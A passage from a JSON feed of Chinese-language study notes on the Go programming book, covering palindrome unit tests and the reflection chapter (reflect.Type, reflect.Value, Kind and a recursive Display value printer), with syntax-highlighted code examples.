class=\"token keyword\">func</span> <span class=\"token function\">TestFrenchPalindrome</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span><span class=\"token function\">IsPalindrome</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"été\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        t<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">`IsPalindrome(\"été\") = false`</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">TestCanalPalindrome</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    input <span class=\"token operator\">:=</span> <span class=\"token string\">\"A man, a plan, a canal: Panama\"</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span><span class=\"token function\">IsPalindrome</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        t<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">`IsPalindrome(%q) = false`</span><span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>为了避免两次输入较长的字符串，我们使用了提供了有类似Printf格式化功能的 Errorf函数来汇报错误结果。\n当添加了这两个测试用例之后，go test返回了测试失败的信息。\n\n先编写测试用例并观察到测试用例触发了和用户报告的错误相同的描述是一个好的测试习惯。只有这样，我们才能定位我们要真正解决的问题。\n参数-v可用于打印每个测试函数的名字和运行时间：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>\n$ go <span class=\"token builtin class-name\">test</span> <span class=\"token parameter variable\">-v</span>\n<span class=\"token operator\">==</span><span class=\"token operator\">=</span> RUN TestPalindrome\n</code></pre></div>",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "12. 反射",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch12.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch12.html",
      "summary": "12. 反射\n12.1. 为何需要反射?\n在 Go 语言中，反射（reflection）是一种强大的机制，允许程序在运行时检查类型信息、操作变量、调用方法等。Go 的反射包 reflect 提供了一组功能，让程序能够动态地检查和操作变量、结构体、接口等信息。\n以下是一些常见情况下使用反射的例子和原因：\n\n通用编程：反射允许编写通用代码，能够在运行时处理...",
      "content_html": "\n<h2>12.1. 为何需要反射?</h2>\n<p>在 Go 语言中，反射（reflection）是一种强大的机制，允许程序在运行时检查类型信息、操作变量、调用方法等。Go 的反射包 <code>reflect</code> 提供了一组功能，让程序能够动态地检查和操作变量、结构体、接口等信息。</p>\n<p>以下是一些常见情况下使用反射的例子和原因：</p>\n<ol>\n<li><strong>通用编程</strong>：反射允许编写通用代码，能够在运行时处理<strong>不同类型的数据结构，而不需要提前知道其类型。</strong></li>\n<li><strong>序列化和反序列化</strong>：通过反射，可以动态地将结构体转换为 JSON、XML 等格式，或者将这些格式转换回结构体。</li>\n<li><strong>动态调用方法</strong>：反射允许程序在运行时调用结构体的方法，而不需要提前知道这些方法的名称。</li>\n<li><strong>类型检查和类型断言</strong>：反射可以用于检查变量的类型，并进行类型断言，特别在处理接口时非常有用。</li>\n<li><strong>代码生成</strong>：某些情况下，反射可以用于生成代码，例如在 ORM（对象关系映射）库中动态创建数据库查询语句。</li>\n</ol>\n<p>一个格式化的函数，我们首先用switch类型分支来测试输入参数是否实现了String方法，如果是的话就调用该方法。然后继续增加类型测试分支，检查这个值的动态类型是否是string、int、bool等基础类型，并在每种情况下执行相应的格式化操作。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">Sprint</span><span class=\"token punctuation\">(</span>x <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">type</span> stringer <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">switch</span> x <span class=\"token operator\">:=</span> x<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">type</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> stringer<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> x<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">case</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> x\n    <span class=\"token keyword\">case</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ...similar cases for int16, uint32, and so on...</span>\n    <span class=\"token keyword\">case</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> x <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string\">\"true\"</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"false\"</span>\n    <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">// array, chan, func, map, pointer, slice, struct</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"???\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>但是我们如何处理其它类似<code>[]float64</code>、<code>map[string][]string</code>等类型呢？我们当然可以添加更多的测试分支，但是这些组合类型的数目基本是无穷的。还有如何处理类似<code>url.Values</code>这样的具名类型呢？即使类型分支可以识别出底层的基础类型是<code>map[string][]string</code>，但是它并不匹配<code>url.Values</code>类型，因为它们是两种不同的类型，而且<code>switch</code>类型分支也不可能包含每个类似<code>url.Values</code>的类型，这会导致对这些库的依赖。</p>\n<p>没有办法来检查未知类型的表示方式，我们被卡住了。这就是我们需要反射的原因。</p>\n<h2>12.2. <code>reflect.Type</code> 和 <code>reflect.Value</code></h2>\n<p>反射是由 reflect 包提供的。它定义了两个重要的类型，Type 和 Value。</p>\n<h3><code>reflect.Type</code></h3>\n<p>一个 Type 表示一个Go类型。它是一个接口，有许多方法来区分类型以及检查它们的组成部分，例如一个结构体的成员或一个函数的参数等。唯一能反映 <code>reflect.Type</code> 实现的是接口的类型描述信息（§7.5），也正是这个实体标识了接口值的动态类型。</p>\n<p>回忆一下<code>interface{} </code>类型，就是<strong>空接口</strong>，它是一个不包含任何方法的接口。空接口可以表示任意类型，因为它不限制其实现类型。空接口在 Go 中被广泛应用，因为它提供了一种在不知道具体类型的情况下存储值的方法。</p>\n<p>以下是一些空接口的特点和用途：</p>\n<ol>\n<li><strong>表示任意类型</strong>：空接口可以接受任何类型的值，因为它不包含任何方法，所以任何类型都满足空接口的要求。</li>\n<li><strong>类型断言</strong>：使用类型断言可以将空接口中的值转换为具体类型。这使得在运行时能够处理不同类型的数据。</li>\n<li><strong>通用容器</strong>：空接口可以用作通用的容器，用于存储不同类型的值，类似于 C# 或 Java 中的 <code>Object</code> 类型。</li>\n</ol>\n<p>示例代码：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"fmt\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> any <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span> <span class=\"token comment\">// 定义一个空接口</span>\n\n    any <span class=\"token operator\">=</span> <span class=\"token number\">42</span> <span class=\"token comment\">// 可以存储任何类型的值</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>any<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出: 42</span>\n\n    any <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello, Go!\"</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>any<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出: Hello, Go!</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>函数<code>reflect.TypeOf</code> 接受任意的 <code>interface{} </code>类型，并以<code>reflect.Type</code>形式返回其动态类型：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>t := reflect.TypeOf(3)  // a reflect.Type\nfmt.Println(t.String()) // \"int\"\nfmt.Println(t)          // \"int\"\n</code></pre></div><p>其中<code>TypeOf(3) </code>调用将值 3 传给 <code>interface{}</code> 参数。回到 7.5节 的将一个具体的值转为接口类型会有一个隐式的接口转换操作，它会创建一个包含两个信息的接口值：操作数的动态类型（这里是 int）和它的动态的值（这里是 3）。</p>\n<p>因为 <code>reflect.TypeOf</code> 返回的是一个动态类型的接口值，它总是返回具体的类型。因此，下面的代码将打印 <code>\"*os.File\" </code>而不是 <code>\"io.Writer\"</code>。稍后，我们将看到能够表达接口类型的<code> reflect.Type</code>。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var w io.Writer = os.Stdout\nfmt.Println(reflect.TypeOf(w)) // \"*os.File\"\n</code></pre></div><p>要注意的是 <code>reflect.Type</code> 接口是满足 <code>fmt.Stringer</code> 接口的。因为打印一个接口的动态类型对于调试和日志是有帮助的，<code> fmt.Printf</code> 提供了一个缩写 %T 参数，内部使用<code>reflect.TypeOf</code>来输出：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Printf(\"%T\\n\", 3) // \"int\"\n</code></pre></div><h3><code>reflect.Value</code></h3>\n<p><code>reflect</code> 包中另一个重要的类型是 Value。一个 <code>reflect.Value</code> 可以装载任意类型的值。函数<code> reflect.ValueOf</code> 接受任意的 <code>interface{}</code> 类型，并返回一个装载着其动态值的 <code>reflect.Value</code>。和 <code>reflect.TypeOf</code> 类似，<code>reflect.ValueOf</code> 返回的结果也是具体的类型，但是 <code>reflect.Value</code> 也可以持有一个接口值。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>v := reflect.ValueOf(3) // a reflect.Value\nfmt.Println(v)          // \"3\"\nfmt.Printf(\"%v\\n\", v)   // \"3\"\nfmt.Println(v.String()) // NOTE: \"&lt;int Value&gt;\"\n</code></pre></div><p>和 <code>reflect.Type</code> 类似，<code>reflect.Value</code> 也满足 <code>fmt.Stringer</code> 接口，但是除非<code> Value</code> 持有的是字符串，否则 <code>String</code> 方法只返回其类型。而使用 <code>fmt</code> 包的<code> %v</code> 标志参数会对<code> reflect.Values</code> 特殊处理。</p>\n<p>对 Value 调用 Type 方法将返回具体类型所对应的 <code>reflect.Type</code>：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>t := v.Type()           // a reflect.Type\nfmt.Println(t.String()) // \"int\"\n</code></pre></div><p><code>reflect.ValueOf</code> 的逆操作是 <code>reflect.Value.Interface</code> 方法。它返回一个 <code>interface{}</code> 类型，装载着与 <code>reflect.Value</code> 相同的具体值：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>v := reflect.ValueOf(3) // a reflect.Value\nx := v.Interface()      // an interface{}\ni := x.(int)            // an int\nfmt.Printf(\"%d\\n\", i)   // \"3\"\n</code></pre></div><p><code>reflect.Value</code> 和 <code>interface{}</code> 都能装载任意的值。所不同的是，一个空的接口隐藏了值内部的表示方式和所有方法，因此只有我们知道具体的动态类型才能使用类型断言来访问内部的值（就像上面那样），内部值我们没法访问。相比之下，一个 Value 则有很多方法来检查其内容，无论它的具体类型是什么。</p>\n<h3>Kind 方法</h3>\n<p>让我们再次尝试实现格式化函数 <code>format.Any</code>。我们使用 <code>reflect.Value</code> 的 <code>Kind</code> 方法来替代之前的类型 <code>switch</code>。虽然还是有无穷多的类型，但是它们的 kinds 类型却是有限的：Bool、String 和 所有数字类型的基础类型；Array 和 Struct 对应的聚合类型；Chan、Func、Ptr、Slice 和 Map 对应的引用类型；interface 类型；还有表示空值的 Invalid 类型。（空的 <code>reflect.Value</code> 的 <code>kind</code> 即为 Invalid。）</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>package format\n\nimport (\n    \"reflect\"\n    \"strconv\"\n)\n\n// Any formats any value as a string.\nfunc Any(value interface{}) string {\n    return formatAtom(reflect.ValueOf(value))\n}\n\n// formatAtom formats a value without inspecting its internal structure.\nfunc formatAtom(v reflect.Value) string {\n    switch v.Kind() {\n    case reflect.Invalid:\n        return \"invalid\"\n    case reflect.Int, reflect.Int8, reflect.Int16,\n        reflect.Int32, reflect.Int64:\n        return strconv.FormatInt(v.Int(), 10)\n    case reflect.Uint, reflect.Uint8, reflect.Uint16,\n        reflect.Uint32, reflect.Uint64, reflect.Uintptr:\n        return strconv.FormatUint(v.Uint(), 10)\n    // ...floating-point and complex cases omitted for brevity...\n    case reflect.Bool:\n        return strconv.FormatBool(v.Bool())\n    case reflect.String:\n        return strconv.Quote(v.String())\n    case reflect.Chan, reflect.Func, reflect.Ptr, reflect.Slice, reflect.Map:\n        return v.Type().String() + \" 0x\" +\n            strconv.FormatUint(uint64(v.Pointer()), 16)\n    default: // reflect.Array, reflect.Struct, reflect.Interface\n        return v.Type().String() + \" value\"\n    }\n}\n</code></pre></div><p>到目前为止，我们的函数将每个值视作一个不可分割没有内部结构的物品，因此它叫 <code>formatAtom</code>。对于聚合类型（结构体和数组）和接口，只是打印值的类型，对于引用类型（channels、functions、pointers、slices 和 maps），打印类型和十六进制的引用地址。虽然还不够理想，但是依然是一个重大的进步，并且 Kind 只关心底层表示，<code>format.Any</code> 也支持具名类型。例如：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var x int64 = 1\nvar d time.Duration = 1 * time.Nanosecond\nfmt.Println(format.Any(x))                  // \"1\"\nfmt.Println(format.Any(d))                  // \"1\"\nfmt.Println(format.Any([]int64{x}))         // \"[]int64 0x8202b87b0\"\nfmt.Println(format.Any([]time.Duration{d})) // \"[]time.Duration 0x8202b87e0\"\n</code></pre></div><figure><figcaption>image-20240731112258817</figcaption></figure>\n<h2>12.3. Display，一个递归的值打印器</h2>\n<p>接下来，让我们看看如何改善聚合数据类型的显示。构建一个用于调试用的Display函数：给定任意一个复杂类型 x，打印这个值对应的完整结构，同时标记每个元素的发现路径。</p>\n<p>应该尽量避免在一个包的API中暴露涉及反射的接口。我们将定义一个未导出的display函数用于递归处理工作，导出的是Display函数，它只是display函数简单的包装以接受<code>interface{}</code>类型的参数：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func Display(name string, x interface{}) {\n    fmt.Printf(\"Display %s (%T):\\n\", name, x)\n    display(name, reflect.ValueOf(x))\n}\n</code></pre></div><p>在display函数中，我们使用了前面定义的打印基础类型——基本类型、函数和chan等——元素值的<code>formatAtom</code>函数，但是我们会使用<code>reflect.Value</code>的方法来递归显示复杂类型的每一个成员。在递归下降过程中，path字符串，从最开始传入的起始值（这里是“e”），将逐步增长来表示是如何达到当前值（例如“<code>e.args[0].value</code>”）的。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> format\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"reflect\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">Display</span><span class=\"token punctuation\">(</span>name <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> x <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Display %s (%T):\\n\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> reflect<span class=\"token punctuation\">.</span><span class=\"token function\">ValueOf</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">display</span><span class=\"token punctuation\">(</span>path <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> v reflect<span class=\"token punctuation\">.</span>Value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">switch</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Kind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Invalid<span class=\"token punctuation\">:</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s = invalid\\n\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Slice<span class=\"token punctuation\">,</span> reflect<span class=\"token punctuation\">.</span>Array<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s[%d]\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Index</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Struct<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">NumField</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\tfieldPath <span class=\"token operator\">:=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s.%s\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Field</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>Name<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>fieldPath<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Field</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Map<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> key <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">MapKeys</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s[%s]\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span>\n\t\t\t\t<span class=\"token function\">formatAtom</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">MapIndex</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Ptr<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">if</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">IsNil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s = nil\\n\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(*%s)\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Elem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Interface<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">if</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">IsNil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s = nil\\n\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s.type = %s\\n\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Elem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>path<span class=\"token operator\">+</span><span class=\"token string\">\".value\"</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Elem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">// basic types, channels, funcs</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s = %s\\n\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> <span class=\"token function\">formatAtom</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>让我们针对不同类型分别讨论。</p>\n<p><strong>Slice和数组：</strong> 两种的处理逻辑是一样的。Len方法返回slice或数组值中的元素个数，<code>Index(i)</code>获得索引i对应的元素，返回的也是一个<code>reflect.Value</code>；如果索引i超出范围的话将导致panic异常，这与数组或slice类型内建的<code>len(a</code>)和<code>a[i]</code>操作类似。display针对序列中的每个元素递归调用自身处理，我们通过在递归处理时向path附加<code>[i]</code>来表示访问路径。</p>\n<p>虽然<code>reflect.Value</code>类型带有很多方法，但是只有少数的方法能对任意值都安全调用。例如，Index方法只能对Slice、数组或字符串类型的值调用，如果对其它类型调用则会导致panic异常。</p>\n<p><strong>结构体：</strong> <code>NumField</code>方法报告结构体中成员的数量，<code>Field(i)</code>以<code>reflect.Value</code>类型返回第i个成员的值。成员列表也包括通过匿名字段提升上来的成员。为了在<code>path</code>添加<code>“.f”</code>来表示成员路径，我们必须获得结构体对应的<code>reflect.Type</code>类型信息，然后访问结构体第i个成员的名字。</p>\n<p><strong>Maps:</strong> <code>MapKeys</code>方法返回一个<code>reflect.Value</code>类型的slice，每一个元素对应<code>map</code>的一个<code>key</code>。和往常一样，遍历map时顺序是随机的。<code>MapIndex(key)</code>返回<code>map</code>中<code>key</code>对应的<code>value</code>。我们向<code>path</code>添加<code>[key]</code>来表示访问路径。（我们这里有一个未完成的工作。其实<code>map</code>的<code>key</code>的类型并不局限于<code>formatAtom</code>能完美处理的类型；数组、结构体和接口都可以作为<code>map</code>的<code>key</code>。针对这种类型，完善<code>key</code>的显示信息是练习12.1的任务。）</p>\n<p><strong>指针：</strong><code> Elem</code>方法返回指针指向的变量，依然是<code>reflect.Value</code>类型。即使指针是<code>nil</code>，这个操作也是安全的，在这种情况下指针是<code>Invalid</code>类型，但是我们可以用<code>IsNil</code>方法来显式地测试一个空指针，这样我们可以打印更合适的信息。我们在path前面添加<code>*</code>，并用括弧包含以避免歧义。</p>\n<p><strong>接口：</strong> 再一次，我们使用<code>IsNil</code>方法来测试接口是否是nil，如果不是，我们可以调用<code>v.Elem()</code>来获取接口对应的动态值，并且打印对应的类型和值。</p>\n<p>现在我们的Display函数总算完工了，让我们看看它的表现吧。下面的Movie类型是在4.5节的电影类型上演变来的：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>type Movie struct {\n    Title, Subtitle string\n    Year            int\n    Color           bool\n    Actor           map[string]string\n    Oscars          []string\n    Sequel          *string\n}\n</code></pre></div><p>让我们声明一个该类型的变量，然后看看Display函数如何显示它：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>strangelove := Movie{\n    Title:    \"Dr. Strangelove\",\n    Subtitle: \"How I Learned to Stop Worrying and Love the Bomb\",\n    Year:     1964,\n    Color:    false,\n    Actor: map[string]string{\n        \"Dr. Strangelove\":            \"Peter Sellers\",\n        \"Grp. Capt. Lionel Mandrake\": \"Peter Sellers\",\n        \"Pres. Merkin Muffley\":       \"Peter Sellers\",\n        \"Gen. Buck Turgidson\":        \"George C. Scott\",\n        \"Brig. Gen. Jack D. Ripper\":  \"Sterling Hayden\",\n        `Maj. T.J. \"King\" Kong`:      \"Slim Pickens\",\n    },\n\n    Oscars: []string{\n        \"Best Actor (Nomin.)\",\n        \"Best Adapted Screenplay (Nomin.)\",\n        \"Best Director (Nomin.)\",\n        \"Best Picture (Nomin.)\",\n    },\n}\n</code></pre></div><figure><figcaption>image-20240731135850186</figcaption></figure>\n<p>观察下面两个例子的区别：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var i interface{} = 3\n\nDisplay(\"i\", i)\n// Output:\n// Display i (int):\n// i = 3\n\nDisplay(\"&amp;i\", &amp;i)\n// Output:\n// Display &amp;i (*interface {}):\n// (*&amp;i).type = int\n// 